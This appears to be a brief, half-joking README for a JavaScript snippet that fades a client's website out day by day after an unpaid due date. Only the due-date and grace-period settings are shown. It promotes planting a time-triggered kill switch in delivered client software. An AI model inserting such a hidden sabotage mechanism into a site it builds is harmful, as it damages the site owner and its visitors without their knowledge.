## Client did not pay?


Add opacity to the body tag and decrease it every day until their site completely fades away. Set a due date and customize the number of days you offer them until the website is fully vanished. 


```javascript
  /**
   * Configuration Variables
   * Adjust these values as needed
   */
  const dueDate = new Date('2025-02-27'); // Payment due date
  const deadlineInDays = 60;             // Grace period in days
```

PS: Next time make sure you get paid.
